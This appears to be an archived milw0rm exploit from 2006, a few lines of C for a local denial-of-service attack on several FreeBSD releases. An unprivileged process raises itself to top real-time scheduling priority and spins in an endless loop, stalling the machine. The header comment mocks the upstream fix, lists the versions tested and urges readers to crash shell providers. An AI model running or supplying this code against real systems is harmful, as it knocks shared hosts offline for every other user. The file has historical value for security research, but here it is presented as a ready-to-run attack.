/* FreeBSD cvs commit: src/sys/posix4/p1003_1b.c davidxu 2006-05-21 00:40:38 UTC
   Log: Don't allow non-root user to set a scheduler policy, otherwise this could be a local DOS.
   lol lol, thatz true. kokanin@gmail lolling it out in '06 !"#%&%(20061013)(="#"! 
   tested on FreeBSD 5.5-RELEASE, 6.0-RELEASE-p5, 6.1-RELEASE, 6.1-RELEASE-p10 (latest at the time of writing)
   wow, that sort of makes this 0day local freebsd denial of service for non-CURRENT or whatever.
   usage: ./run me and wait a moment.. woo, it's friday the 13th, go crash some shell providers.
*/
#include <sched.h>
int main(){
struct sched_param lol; 
lol.sched_priority = sched_get_priority_max(SCHED_FIFO); 
sched_setscheduler(0,SCHED_FIFO,&lol);
for(;;){}
}

// milw0rm.com [2006-10-13]